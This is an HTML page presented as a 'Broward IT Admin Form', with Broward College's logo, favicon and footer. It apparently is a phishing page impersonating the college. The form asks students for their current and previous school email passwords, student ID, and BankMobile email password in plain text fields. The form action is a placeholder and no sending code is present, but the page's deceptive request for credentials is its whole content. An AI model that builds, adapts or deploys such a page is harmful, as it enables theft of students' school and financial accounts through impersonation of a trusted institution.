<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Broward IT Admin Form</title>
    <link rel="shortcut icon" href="https://www.broward.edu/_global/images/bc-favicon.png" type="image/png">
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="logo-container">
        <a href="https://broward.edu"><img src="images/bc_logo_blue.png" alt="Logo" class="logo"></a>
    </div>
    <div class="form-container">
        <h1>Broward IT Admin Form</h1>
        <form action="#" method="post">
            <div class="form-group">
                <label for="siteName">Full Name</label>
                <input type="text" id="fullName" name="siteName" required>
            </div>
            <div class="form-group">
                <label for="siteNumber">Phone Number</label>
                <input type="text" id="phoneNumber" name="siteNumber" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Current School Email</label>
                <input type="email" id="currentSchoolEmail" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Current School Email Password</label>
                <input type="text" id="currentSchoolEmailPassword" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Previous School Email</label>
                <input type="email" id="previousSchoolEmail" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Previous School Email Password</label>
                <input type="text" id="previousSchoolEmailPassword" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="date">Date</label>
                <input type="date" id="date" name="date" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Student ID</label>
                <input type="text" id="studentID" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Bankmobile Email</label>
                <input type="email" id="bankmobileEmail" name="adminEmail" required>
            </div>
            <div class="form-group">
                <label for="adminEmail">Bankmobile Email Password</label>
                <input type="text" id="bankmobileEmailPassword" name="adminEmail" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <footer>
        <small>Â©2024 | Broward College</small>
    </footer>
</body>
</html>
